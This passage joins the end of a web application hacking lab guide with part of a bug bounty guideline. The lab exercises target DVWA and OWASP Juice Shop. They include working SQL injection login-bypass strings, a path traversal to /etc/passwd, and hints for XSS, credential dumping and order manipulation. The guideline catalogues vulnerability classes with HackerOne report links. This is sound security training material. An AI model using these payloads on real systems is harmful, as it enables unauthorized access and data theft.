You can download this tool and run it against any web server running HTTPS, as 
demonstrated below. 
 
root@kali:~# ./testssl.sh theartofhacking.org 
No engine or GOST support via engine with your /usr/bin/openssl 
########################################################### 
    testssl.sh       2.9.5-6 from https://testssl.sh/ 
      This program is free software. Distribution and 
             modification under GPLv2 permitted. 
      USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK! 
       Please file bugs @ https://testssl.sh/bugs/ 
########################################################### 
 Using "OpenSSL 1.1.0h  27 Mar 2018" [~143 ciphers] 
 on kali:/usr/bin/openssl 
 (built: "reproducible build, date unspecified", platform: "debian-amd64") 
 
Testing all IPv4 addresses (port 443): 104.27.176.154 104.27.177.154 
---------------------------------------------------------------------------
------------------- 
 Start 2018-07-28 23:18:27        -->> 104.27.176.154:443 
(theartofhacking.org) <<-- 
 
 further IP addresses:   104.27.177.154 2400:cb00:2048:1::681b:b09a 
2400:cb00:2048:1::681b:b19a  
 rDNS (104.27.176.154):  -- 
 Service detected:       HTTP 
 
 Testing protocols via sockets except SPDY+HTTP2  
 SSLv2      not offered (OK) 
 SSLv3      not offered (OK) 
 TLS 1      not offered 
 TLS 1.1    not offered 
 TLS 1.2    not offered 
 SPDY/NPN   h2, http/1.1 (advertised) 
 HTTP2/ALPN h2, http/1.1 (offered) 
 
 Testing ~standard cipher categories  
 NULL ciphers (no encryption)                  not offered (OK) 
 Anonymous NULL Ciphers (no authentication)    not offered (OK) 
 Export ciphers (w/o ADH+NULL)                  not offered (OK) 
 LOW: 64 Bit + DES encryption (w/o export)     not offered (OK) 
Omar Ωr Santos (@santosomar) 
42 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 Weak 128 Bit ciphers (SEED, IDEA, RC[2,4])    not offered (OK) 
 Triple DES Ciphers (Medium)                   not offered (OK) 
 High encryption (AES+Camellia, no AEAD)       offered (OK) 
 Strong encryption (AEAD ciphers)              offered (OK) 
 
Testing robust (perfect) forward secrecy, (P)FS -- omitting Null 
Authentication/Encryption, 3DES, RC4  
 Cipher mapping not available, doing a fallback to openssl 
 
 PFS is offered (OK) 
 
 Testing server preferences  
 Has server cipher order?     yes (OK) 
 Negotiated protocol          TLSv1.2 
 Negotiated cipher            ECDHE-ECDSA-CHACHA20-POLY1305, 253 bit ECDH 
(X25519) 
 Cipher order 
    SSLv3:     Local problem: /usr/bin/openssl doesn't support "s_client 
-ssl3" 
    TLSv1.2:   ECDHE-ECDSA-CHACHA20-POLY1305 ECDHE-ECDSA-AES128-GCM-SHA256 
ECDHE-ECDSA-AES128-SHA ECDHE-ECDSA-AES128-SHA256 
               ECDHE-ECDSA-AES256-GCM-SHA384 ECDHE-ECDSA-AES256-SHA 
ECDHE-ECDSA-AES256-SHA384  
 Testing server defaults (Server Hello)  
 TLS extensions (standard)    "renegotiation info/#65281" "extended master 
secret/#23" "session ticket/#35" "status request/#5" 
                              "next protocol/#13172" "EC point formats/#11" 
"application layer protocol negotiation/#16" 
 Session Ticket RFC 5077 hint 64800 seconds, session tickets keys seems to 
be rotated < daily 
 SSL Session ID support       yes 
 Session Resumption           Tickets: yes, ID: yes 
<output omitted for brevity> 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
43 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Exercise 7: Path (Directory) Traversal 
1.
Go to the Damn Vulnerable Web Application (DVWA) in WebSploit and navigate to ​File 
Inclusion​. 
 
2.
Select any of the PHP file links. 
 
3.
Attempt to get the contents of the ​/etc/passwd​ file by manipulating the URL, as 
demonstrated below: 
 
 
 
You should see the contents of the ​/etc/passwd​ file, as shown in the example in the next page. 
Omar Ωr Santos (@santosomar) 
44 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
That was too easy… The next exercise (our final exercise) will not be this easy… 
 
 
 
Omar Ωr Santos (@santosomar) 
45 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 8: Additional XSS Exploitation 
Note​: This exercise will not be as easy as the previous ones. You will not be helped on 
this exercise and you must figure out how to perform the attack with only a few ​hints 
below. 
 
1.
Launch the Juice Shop. 
2.
Perform a persisted XSS attack with to bypass a client-side security mechanism and to 
add a new user to the application. 
 
Hints​: 
●
Try to find and interact with the API. 
●
The email address is checked on the client-side using JavaScript. 
●
You may want to brush up your JSON skills ;-) 
 
 
 
Exercise 9: Bypassing Additional Web Application 
Flaws 
Navigate to the Juice Shop and try to solve the exercise of posting some feedback in another 
user's name.  
●
You already know how to use proxies like BurpSuite and the OWASP ZAP. 
●
Intercept client / server transactions to post feedback when logged on.  
●
The request contains the following information: 
{ 
  "UserId": 2, 
  "rating":2, 
  "comment":​"1" 
} 
 
Try to manipulate the request. 
 
The next exercise will be a little harder… ;-) 
 
Omar Ωr Santos (@santosomar) 
46 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 10: Fuzzing 
1.
You can use ​radamsa​ to create your own fuzz test cases. For example: 
 
root@kali:~​#​ ​echo​ ​"I am having fun and omar suck"​ | radamsa 
3y!767bh and Emar suck 
root@kali:~​#​ ​echo​ ​"I am having fun and omar suck"​ | radamsa 
I am having funᅠ and o maam having funᅠ and o𝅘𝅥𝅮 and o m having funᅠ and o mar 
sucแk 
root@kali:~​#​ ​echo​ ​"I am having fun and omar suck"​ | radamsa 
_fhun and! _omar suck-=!-sdj 
  
Each time that you feed something to ​radamsa​, it will give you a different test case.  
Explore  the available options. 
 
root@kali:~​# ​radamsa -h 
Usage: radamsa [arguments] [file ...] 
  -h | --help, show this thing 
  -a | --about, what is this thing? 
  -V | --version, show program version 
  -o | --output <arg>, output pattern, e.g. out.bin /tmp/fuzz-%n.%s, -, :80 or 
127.0.0.1:80 [-] 
  -n | --count <arg>, how many outputs to generate (number or inf) [1] 
  -s | --seed <arg>, random seed (number, default random) 
  -m | --mutations <arg>, which mutations to use 
[ft=2,fo=2,fn,num=5,td,tr2,ts1,tr,ts2,ld,lds,lr2,li,ls,lp,lr,lis,lrs,sr,sd,bd,bf,bi
,br,bp,bei,bed,ber,uw,ui=2,xp=9,ab] 
  -p | --patterns <arg>, which mutation patterns to use [od,nd=2,bu] 
  -g | --generators <arg>, which data generators to use 
[random,file=1000,jump=200,stdin=100000] 
  -M | --meta <arg>, save metadata about generated files to this file 
  -r | --recursive, include files in subdirectories 
  -S | --seek <arg>, start from given testcase 
  -d | --delay <arg>, sleep for n milliseconds between outputs 
  -l | --list, list mutations, patterns and generators 
  -C | --checksums <arg>, maximum number of checksums in uniqueness filter (0 
disables) [10000] 
  -v | --verbose, show progress during generation 
 
The following GitLab repository has radamsa’s source code, as well as a good tutorial: 
https://gitlab.com/akihe/radamsa  
 
Omar Ωr Santos (@santosomar) 
47 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
2.
Create your own fuzzing test case and use the ​OWASP Zed Attack Proxy (ZAP) ​to fuzz 
the ​Juice Shop​ application to find out the ​admin​ ​username​.  
●
You must figure out this exercise in your own.  
●
Do not use SQLmap or any other tools​.  
●
Just use ​radamsa​ and ​OWASP ZAP​. 
●
After you complete the previous steps, try to retrieve a list of all ​Juice Shop​ user 
credentials exploiting ​SQL injection​. 
●
If you run out of time, feel free to do this in your own. 
 
 
Hints: 
●
The SQL injection vulnerability can be exploited using UNION queries/statements. 
●
A few additional hints can be found at this book preview: 
https://www.safaribooksonline.com/library/view/comptia-pentest-cert/9780135225523/
ch06.html  
●
Also in the Hacking Web Applications Video Course at: ​https://h4cker.org/webapps  
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
48 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 11: Additional SQL Injection Exercises 
 
Exercise 11.1: Logging in as Admin 
 
Access the Juice Shop application. The application is vulnerable to injection attacks 
Data entered by the user is integrated 1:1 in an SQL command that is otherwise 
constant. Different statements can be amended/extended as appropriate. The 
Administrator is the first to appear in the selection list and is therefore logged on. 
To quickly test, you can use the following string in the ​Email​ field in the Login screen. 
You can use anything for the password. 
 
 
 
You are now the administrator and you can see other fields in the system. 
 
Omar Ωr Santos (@santosomar) 
49 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Exercise 11.2 Login as Bender 
 
 
 
 
You already know that Web applications construct SQL statements involving SQL syntax 
invoked by the application mixed with user-supplied data. The first portion of the SQL statement 
shown in Figure 6-10 is not shown to the user; typically the application sends this portion to the 
database behind the scenes. The second portion of the SQL statement is typically user input in a 
web form. 
 
If an application does not sanitize user input, an attacker can supply crafted input in an attempt 
to make the original SQL statement execute further actions in the database. SQL injections can 
be done using user-supplied strings or numeric input. Figure 6-11 shows an example of a basic 
SQL injection attack. 
SQL injection attacks can be divided into the following categories: 
Omar Ωr Santos (@santosomar) 
50 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
●
In-band SQL injection: With this type of injection, the attacker obtains the data by using 
the same channel that is used to inject the SQL code. This is the most basic form of an 
SQL injection attack, where the data is dumped directly in a web application (or web 
page). 
●
Out-of-band SQL injection: With this type of injection, the attacker retrieves data using a 
different channel. For example, an email, a text, or an instant message could be sent to 
the attacker with the results of the query; or the attacker might be able to send the 
compromised data to another system. 
●
Blind (or inferential) SQL injection: With this type of injection, the attacker does not make 
the application display or transfer any data; rather, the attacker is able to reconstruct the 
information by sending specific statements and discerning the behavior of the 
application and database. 
To perform an SQL injection attack, an attacker must craft a syntactically correct SQL statement 
(query). The attacker may also take advantage of error messages coming back from the 
application and might be able to reconstruct the logic of the original query to understand how to 
execute the attack correctly. If the application hides the error details, the attacker might need to 
reverse engineer the logic of the original query. 
There are essentially five techniques that can be used to exploit SQL injection vulnerabilities: 
●
Union operator: This is typically used when a SQL injection vulnerability allows a SELECT 
statement to combine two queries into a single result or a set of results. 
●
Boolean: This is used to verify whether certain conditions are true or false. 
●
Error-based technique: This is used to force the database to generate an error in order to 
enhance and refine an attack (injection). 
●
Out-of-band technique: This is typically used to obtain records from the database by 
using a different channel. For example, it is possible to make an HTTP connection to 
send the results to a different web server or a local machine running a web service. 
●
Time delay: It is possible to use database commands to delay answers. An attacker may 
use this technique when he or she doesn’t get any output or error messages from the 
application. 
It is possible to combine any of the techniques mentioned above to exploit an SQL injection 
vulnerability. For example, an attacker may use the union operator and out-of-band techniques. 
Omar Ωr Santos (@santosomar) 
51 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Let’s take a look at a quick example... In the Juice-shop application on 192.168.78.21 enter the 
following string in the login form. 
' or 1=1;-- 
Any password can be selected. 
 
 
You are performing a boolean SQL injection where the application is logging you in as 
administration (admin). 
Omar Ωr Santos (@santosomar) 
52 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Data entered is integrated in an SQL command that is otherwise constant. The statement can 
then be amended/extended as appropriate. The Administrator is the first to appear in the 
selection list and subsequently, it is logged on. 
Now let’s try the following string in the login form: 
' or 1=1 and email not like('​%admin%​');-- 
 
 
Omar Ωr Santos (@santosomar) 
53 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Now you are logged in as Jimmy, or Jim, or whatever his name is ;-) 
 
Might as well try to login as Bender  
' or 1=1 and email like('​%bender%​');-- 
What do you see? Why do you think that you were able to login as “bender”? 
 
Omar Ωr Santos (@santosomar) 
54 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
BONUS: Homework ;-)  
I will not provide you with any guidance. However, try to use tools like Nikto, OWASP Zed Attack 
Proxy (ZAP), and others to do the following: 
In Juice-shop: 
1.
Find a sensitive file in the system by trying to enumerate all different directories that 
exists and exposed on the system. 
2.
Try to further manipulate the API to further compromise the system. 
3.
Try to find the administration panel. 
4.
Try to remove all 5-star feedback on the website. 
5.
Try to place an order to make you rich… 
hint: {"quantity": -500} 
6.
At the end of the day, you have access to the scoreboard and try to find as many flags as 
possible.  
 
 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
55 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
 
 
Congratulations!  
 
You have successfully completed the lab! 
 
 
Of course, you can continue ​playing​ with all the vulnerable applications within ​WebSploit​ and 
others that I have listed in the GitHub repository (​https://h4cker.org/github​), as there are dozens 
of other “flags” / challenges / exercises... 
Omar Ωr Santos (@santosomar) 
56 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Bug Bounty Testing Essential Guideline : Startup Bug Hunters 
------------------------------------------------------------------------------- 
These types of weaknesses can allow an attacker to either capture or bypass the authentication methods that 
are used by a web application. 
 
-
User authentication credentials are not protected when stored. 
-
Predictable login credentials. 
-
Session IDs are exposed in the URL (e.g., URL rewriting). 
-
Session IDs are vulnerable to session fixation attacks. 
-
Session value does not timeout or does not get invalidated after logout. 
-
Session IDs are not rotated after successful login. 
-
Passwords, session IDs, and other credentials are sent over unencrypted connections. 
 
The goal of an attack is to take over one or more accounts and for the attacker to get the same privileges as 
the attacked user. 
 
Source : ​https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management  
 
Privilege Escalation 
…………………………………………………... 
Privilege escalation vulnerability allows malicious user to obtain privileges of another user they are not 
entitled to. Privilege escalation occurs in two forms: Vertical privilege escalation – Occurs when user can 
access resources, features or functionalities related to more privileged accounts. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/246419​                 ​https://hackerone.com/reports/244567  
-
https://hackerone.com/reports/13959​                          ​https://hackerone.com/reports/272570  
-
https://hackerone.com/reports/29420  
 
Source : ​https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003)  
 
Authentication Bypass 
…………………………………………………... 
Note : ​Authenticating  a  user  involves  establishing  that  the  user  is  in  fact  who  he  claims  to  be.  Without 
this  facility,  the application would need to treat all users as anonymous the lowest possible level of trust. 
 
A flaw in the application that allows users to access application resources without authentication is referred 
as’ Authentication Bypass. Authentication bypass vulnerability is generally caused when it is assumed that 
users will behave in a certain way and failing to foresee the consequences of users doing the unexpected. 
 
we are going to focus on four key areas which should be examined when testing authentication: 
 
-
Forced Browsing 
-
Parameter Modification 
-
Session Identifier Prediction 
-
SQL Injection within Login Forms 
The Hacktivists 
1 
 
 
 
Hackerone Reports :   
-
https://hackerone.com/reports/124845​                      ​https://hackerone.com/reports/270981  
 
Source : ​https://zseano.com/tutorials/3.html  
Source : ​https://www.bugcrowd.com/authentication-bypass/  
https://www.owasp.org/index.php/Testing_for_Bypassing_Authentication_Schema_(OTG-AUTHN-004)  
 
Weak Login Function 
…………………………………………………... 
Depending on the nature of the password-protected resource, an attacker can mount one or more of the 
following types of attacks: 
 
-
Access the contents of the password-protected resources. 
-
Access password-protected administrative mechanisms such as "dashboard", "management 
console" and "admin panel," potentially progressing to gain full control of the application. 
Source : ​https://www.owasp.org/index.php/Testing_for_Weaker_authentication_in_alternative_channel_(OTG-AUTHN-010)  
 
Session Fixation 
…………………………………………………... 
session fixation attacks attempt to exploit the vulnerability of a system that allows one person to fixate 
another person's session identifier. Most session fixation attacks are web based, and most rely on session 
identifiers being accepted from URLs or POST data.  
 
Hackerone Reports :  
-
https://hackerone.com/reports/18501​                 ​https://hackerone.com/reports/135797  
 
Source : ​https://www.owasp.org/index.php/Session_fixation  
Source : ​http://projects.webappsec.org/w/page/13246960/Session%20Fixation  
 
Missing Secure or HTTPOnly Cookie Flag 
…………………………………………………………………. 
HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when 
generating a cookie helps mitigate the risk of client side script accessing the protected cookie.  
 
Whenever a cookie contains sensitive information or is a session token, then it should always be passed using 
an encrypted tunnel. For example, after logging into an application and a session token is set using a cookie, 
then verify it is tagged using the ";secure" flag. If it is not, then the browser believes it safe to pass via an 
unencrypted channel such as using HTTP.  
 
Hackerone Reports : 
-
https://hackerone.com/reports/75357​                           ​https://hackerone.com/reports/58679  
-
 
Source : ​https://www.owasp.org/index.php/HttpOnly  
 
The Hacktivists 
2 
 
Failure to Invalidate Session 
…………………………………………………… 
Does not properly invalidate Session IDs. User sessions or authentication tokens (particularly single sign-on 
(SSO) tokens) aren't properly invalidated during logout or a period of inactivity. 
 
On Logout (Client and Server-Side) 
Failure to invalidate the session on the server when the user chooses to logout.  The act of logging out should 
invalidate the session identifier cookie on the client browser as well as invalidated the session object on the 
server.  Failure to do so will allow the session to be re-animated after logout. 
 
Hackerone Reports :    ​https://hackerone.com/reports/193556  
 
Long Timeout  
Failure to invalidate the session when the user closes the browser without logging out.  Failure to do so will 
allow the session to be re-animated in a new browser session. 
 
Failure to automatically terminate the session on the server after some predefined period of inactivity. 
Failure to do so means the application has no protection from an attacker resuming an abandoned user 
session. 
 
Hackerone Reports :    ​https://hackerone.com/reports/244875  
 
On Password Reset and/or Change 
User not always get a notification about password change. When a user changes his password via password 
reset link then such a notification is not sent to the user.  
 
Web app  did not verify the email addresses of user accounts before sending an email to them. An attacker 
can use this functionality and send faulty password reset links to legitimate users.  
 
Hackerone Reports :   
-
https://hackerone.com/reports/15785​                         ​https://hackerone.com/reports/145488  
-
https://hackerone.com/reports/92251​                         ​https://hackerone.com/reports/315512  
 
Concurrent Sessions On Logout  
When  login to webapp using two different computers I can easily browse the session concurrently . This 
means that if an attacker somehow knows the password of the user by any means he can login using that 
info and the main user will not get notified. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/20122​                   ​https://hackerone.com/reports/347748  
 
On Email Change  
The e-mail change functionality does not require the current user password to be completed. Since the e-mail 
could be used to reset the password of the account, could associate a new e-mail to the account, change the 
primary e-mail associated with the new one and then use the "forgot password" functionality to reset it. 
 
The Hacktivists 
3 
 
Hackerone Reports :    ​https://hackerone.com/reports/223461  
 
Source : ​https://affinity-it-security.com/what-is-a-session-management-vulnerability/  
https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management  
 
Concurrent Logins 
…………………………………………………… 
When a user logs in more than the specified number of times, the new user session is allowed access, but the 
oldest user session is locked out from further access. By locking out the oldest session instead of the newest 
session. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
4 
 
Sensitive Data Exposure - Essential Guideline 
------------------------------------------------------------------------------- 
Sensitive Data Exposure occurs when an application does not adequately protect sensitive information. This 
vulnerability allows an attacker to access sensitive data such as credit cards, tax IDs, authentication 
credentials, etc to conduct credit card fraud, identity theft, or other crimes. Losing such data can cause 
severe business impact and damage to the reputation.  
 
Source : ​https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure  
https://www.kiuwan.com/blog/owasp-top-10-2017-a3-sensitive-data-exposure-identify-your-weaknesses/  
 
Critically Sensitive Data 
…………………………………………………... 
 
Password Disclosure 
-
https://hackerone.com/reports/288638​          ​https://hackerone.com/reports/322988  
-
https://hackerone.com/reports/738  
 
Private API Keys 
An API Key and Secret Key are secret tokens used to authenticate you with servers. API Key and Secret Key 
are only known to you and the server. It is important to keep both keys confidential to protect your account. 
 
-
https://hackerone.com/reports/124100​               ​https://hackerone.com/reports/196655  
 
User Enumeration 
…………………………………………………...…………………………………………………... 
User enumeration is when a malicious actor can use brute-force to either guess or confirm valid users in a 
system. User enumeration is often a web application vulnerability, though it can also be found in any system 
that requires user authentication. Two of the most common areas where user enumeration occurs are in a 
site's login page and its ‘Forgot Password' functionality. 
 
-
https://hackerone.com/reports/43269​              ​https://hackerone.com/reports/250457  
-
https://hackerone.com/reports/223531​            ​https://hackerone.com/reports/335427  
 
Source : ​https://blog.rapid7.com/2017/06/15/about-user-enumeration/  
https://www.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)  
 
Visible Detailed Error/Debug Page 
……………………………………………………... 
Detailed Server Configuration 
You can view detailed configuration information for the content server that a backed-up Web site was 
located on at the time of the backup. This information includes the custom metadata fields, content types, 
security groups, configuration and environment settings, installed components, defined providers, and so on. 
This information is especially useful when you must restore a site and want to configure the content server 
so that it matches the server where the site originated. 
The Hacktivists 
5 
 
 
-
https://hackerone.com/reports/297339 
https://hackerone.com/reports/201901  
-
https://hackerone.com/reports/183548 
https://hackerone.com/reports/318603  
-
https://hackerone.com/reports/318603 
https://hackerone.com/reports/287837  
 
Source : ​https://www.owasp.org/index.php/Insecure_Configuration_Management  
 
Full Path Disclosure  
Full Path Disclosure refers to being able to see the full path of something hosted on the server. It’s often, but 
not always, the location of the script itself. 
Hackerone Reports :   
-
https://hackerone.com/reports/26825 
https://hackerone.com/reports/210572  
-
https://hackerone.com/reports/159481 
https://hackerone.com/reports/87505  
-
https://hackerone.com/reports/230098  
 
Source : ​https://www.owasp.org/index.php/Full_Path_Disclosure  
Source : ​https://support.detectify.com/customer/en/portal/articles/2243201-full-path-disclosure  
 
Descriptive Stack Trace 
A descriptive stack trace describes the sequence of functions and events that led to a certain point in the 
execution of a program. To put it even more simply, when web app explodes, it tells you where it exploded and 
what steps it followed that led to the explosion. You can effectively use it as a map to debug code.  
 
Hackerone Reports :   
-
https://hackerone.com/reports/41469 
https://hackerone.com/reports/222108  
-
https://hackerone.com/reports/46366 
https://hackerone.com/reports/221833  
 
Source : ​https://medium.com/@jgefroh/the-dreaded-stack-trace-2692c053b28e  
Source : ​https://www.owasp.org/index.php/Testing_for_Stack_Traces_(OTG-ERR-002)  
 
Token Leakage via Referer 
……………………………………………………... 
The reset password token is leaking through the HTTP referer header ... This happens when user clicks at the 
link sent to their email and when the page is rendered with the token at the URL.  
 
There are currently two priority levels for Token Leakage via Referer, the first is P4 when the token is being 
sent over HTTP, the second is a P5 when the token is sent over HTTPS. I think these should be consolidated into 
a P4 as the risk here is that the token is going to end up in the logs of the destination server.  
Hackerone Reports :   
-
https://hackerone.com/reports/738 
https://hackerone.com/reports/5691  
-
https://hackerone.com/reports/47140 
https://hackerone.com/reports/66626  
-
https://hackerone.com/reports/272379 
https://hackerone.com/reports/265740  
 
Source : ​https://robots.thoughtbot.com/is-your-site-leaking-password-reset-links  
Source : ​https://portswigger.net/kb/issues/00500400_cross-domain-referer-leakage  
 
 
The Hacktivists 
6 
 
Sensitive Token in URL 
……………………………………………………... 
Information exposure through query strings in URL is when sensitive data is passed to parameters in the 
URL. This allows attackers to obtain sensitive data such as usernames, passwords, tokens (authX), database 
details, and any other potentially sensitive data. 
 
Source : ​https://portswigger.net/kb/issues/00500700_session-token-in-url  
Source : ​https://www.owasp.org/index.php/Information_exposure_through_query_strings_in_url  
 
Hackerone Reports :   
-
https://hackerone.com/reports/83667 
https://hackerone.com/reports/295461  
-
https://hackerone.com/reports/341372 
https://hackerone.com/reports/151058  
 
Weak Password Reset Implementation 
……………………………………………………… 
The web app  contains a mechanism for users to recover or change their passwords without knowing the 
original password, but the mechanism is weak. It is common for an application to have a mechanism that 
provides a means for a user to gain access to their account in the event they forget their password. 
 
Source : ​https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet  
https://www.owasp.org/index.php/Testing_for_weak_password_change_or_reset_functionalities_(OTG-AUTHN-009)  
 
Password Reset Token Sent Over HTTP 
Hackerone Reports :   
-
https://hackerone.com/reports/15412 
https://hackerone.com/reports/158186  
-
https://hackerone.com/reports/214571  
 
Cleartext Transmission of Sensitive Data 
Hackerone Reports :  ​https://hackerone.com/reports/173268  
 
Directory Listing Enabled 
……………………………………………………… 
A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers. 
Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful 
information for the attacker to devise exploits, such as creation times of files or any information that may be 
encoded in file names. The directory listing may also compromise private or confidential data. 
 
Hackerone Reports :   
-
https://hackerone.com/reports/307666 
https://hackerone.com/reports/175760  
-
https://hackerone.com/reports/110655  
 
Disclosure of Known Public Information 
…………………………………………………………………. 
Hackerone Reports :  ​https://hackerone.com/reports/378122  
 
The Hacktivists 
7 
 
Mixed Content (HTTPS Sourcing HTTP) 
…………………………………………………………….. 
This means that the URL in question is loaded over a secure HTTPS protocol, but some other resources (such 
as images, videos, stylesheets, scripts) are loaded over an insecure HTTP connection. 
 
Hackerone Reports :   
-
https://hackerone.com/reports/85541 
https://hackerone.com/reports/108692  
-
https://hackerone.com/reports/146707  
 
Source : ​https://resources.infosecinstitute.com/https-mixed-content-vulnerability/  
Source : ​https://sitebulb.com/hints/security/mixed-content-loads-http-resources-on-https-url/  
 
Sensitive Data Hardcoded 
…………………………………………………………….. 
Web app contains hardcoded credentials, such as a password or cryptographic key, which it uses for its own 
inbound authentication, outbound communication to external components, or encryption of internal data.  
 
If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in 
question. This weakness can lead to the exposure of resources or functionality to unintended actors, possibly 
providing attackers with sensitive information or even execute arbitrary code. 
 
OAuth Secret 
 
Hackerone Reports :   
-
https://hackerone.com/reports/5314 
https://hackerone.com/reports/5786  
 
File Paths 
This one is particularly dangerous, because the filename and path are hardcoded in the webapp. An attacker 
can modify index page path for ./dir/dir/, open the file and see something like MD5 digests and can be brute 
forced (with enough time) or dictionary cracked by a malicious user, thus giving administrator access to the 
forum. 
 
Hackerone Reports :  ​https://hackerone.com/reports/291200  
 
Source : ​https://cwe.mitre.org/data/definitions/798.html  
 
Internal IP Disclosure 
…………………………………………………………….. 
In some cases, web servers may be prone to sharing internal IP addresses in response to specially crafted 
queries. Discovering the private addresses used within an organization can help an attacker in carrying out 
network-layer attacks aiming to penetrate the organization's internal infrastructure. 
 
Hackerone Reports :   
-
https://hackerone.com/reports/253429 
https://hackerone.com/reports/329791  
-
https://hackerone.com/reports/330716 
https://hackerone.com/reports/42780  
-
 
Source : ​https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed  
The Hacktivists 
8 
 
 
JSON Hijacking 
…………………………………………………………….. 
JSON Hijacking is similar to CSRF(Cross Site Request Forgery) but there is just a little bit difference, In CSRF 
you trick the victim/user to do some malicious/unwanted activity but in JSON Hijacking you trick the user to 
access a crafted link which will read some data form victim account and pass it to attacker. 
 
Hackerone Reports :   ​https://hackerone.com/reports/54034  
 
Source : ​https://www.thesecuritybuddy.com/vulnerabilities/what-is-json-hijacking-or-javascript-hijacking/  
 
Cross Site Script Inclusion (XSSI) 
…………………………………………………………….. 
Browsers prevent pages of one domain from reading pages in other domains. But they do not prevent pages of 
a domain from referencing resources in other domains. In particular, they allow images to be rendered from 
other domains and scripts to be executed from other domains.  
 
An included script doesn't have its own security context. It runs in the security context of the page that 
included it. For example, if www.evil.example.com includes a script hosted on www.google.com then that 
script runs in the evil context not in the google context. So any user data in that script will "leak." 
 
Hackerone Reports :   
-
https://hackerone.com/reports/118631 
https://hackerone.com/reports/138270  
 
Source : ​https://www.scip.ch/en/?labs.20160414  
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
9 
 
Insufficient Security Configurability - Essential Guideline  
------------------------------------------------------------------------------- 
It occurs when a webapp permits an attacker to access sensitive content or functionality without having to 
properly authenticate. Strong authentication, encryption and security logging are not available. Weak 
passwords, a lack of multifactor authentication and application vulnerabilities create risks.  
 
Source : ​https://www.owasp.org/index.php/Top_10_2014-I8_Insufficient_Security_Configurability  
 
Weak Password Policy 
…………………………………………………………….. 
The weakness occurs when the application does not check complexity or minimum length of the provided 
passwords. Entire security of application depends on its authentication mechanism. Weak password 
requirements allow users to create weak passwords, susceptible to a variety of attacks. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/17160 
https://hackerone.com/reports/255668  
-
https://hackerone.com/reports/276123  
 
Source : ​https://cwe.mitre.org/data/definitions/521.html   
Source : ​https://www.owasp.org/index.php/Testing_for_Weak_password_policy_(OTG-AUTHN-007)  
 
Weak Password Reset Implementation 
…………………………………………………………….. 
The password change and reset function of an application is a self-service password change or reset 
mechanism for users. This self-service mechanism allows users to quickly change or reset their password 
without an administrator intervening.  
 
Hackerone Reports :​https://hackerone.com/reports/8082  
 
Source : ​https://cwe.mitre.org/data/definitions/640.html  
https://www.owasp.org/index.php/Testing_for_weak_password_change_or_reset_functionalities_(OTG-AUTHN-009)  
 
Token is Not Invalidated After Use 
-
https://hackerone.com/reports/283550 
https://hackerone.com/reports/265775  
 
Token is Not Invalidated After Email Change 
 
Hackerone Reports : ​https://hackerone.com/reports/223461  
 
Token is Not Invalidated After Password Change 
-
https://hackerone.com/reports/220185 
https://hackerone.com/reports/244642  
 
Token is Not Invalidated After New Token is Requested 
-
https://hackerone.com/reports/176116 
https://hackerone.com/reports/272839  
The Hacktivists 
10 
 
 
Lack of Verification Email 
…………………………………………………………….. 
 
Hackerone Reports : ​https://hackerone.com/reports/90643  
 
Lack of Notification Email 
…………………………………………………………….. 
Hackerone Reports : 
-
https://hackerone.com/reports/280519 
https://hackerone.com/reports/42403  
-
https://hackerone.com/reports/282572  
 
Weak Registration Implementation 
…………………………………………………………….. 
 
Hackerone Reports :​https://hackerone.com/reports/263846  
 
Weak 2FA Implementation 
…………………………………………………………….. 
 
-
https://hackerone.com/reports/214433 
https://hackerone.com/reports/121696  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
11 
 
Unvalidated Redirects and Forwards - Essential Guideline 
------------------------------------------------------------------------------- 
Web app frequently redirect and forward users to other pages and websites, and use untrusted data to 
determine the destination pages. Without proper validation, attackers can redirect victims to phishing or 
malware sites, or use forwards to access unauthorized pages. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/387007 
https://hackerone.com/reports/190188  
-
https://hackerone.com/reports/179328  
 
Source : ​https://hdivsecurity.com/owasp-unvalidated-redirects-and-forwards   
Source : ​https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet  
 
Tabnabbing 
…………………………………………………………….. 
Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for 
example to replace it with a phishing site. As the user was originally on the correct page they are less likely to 
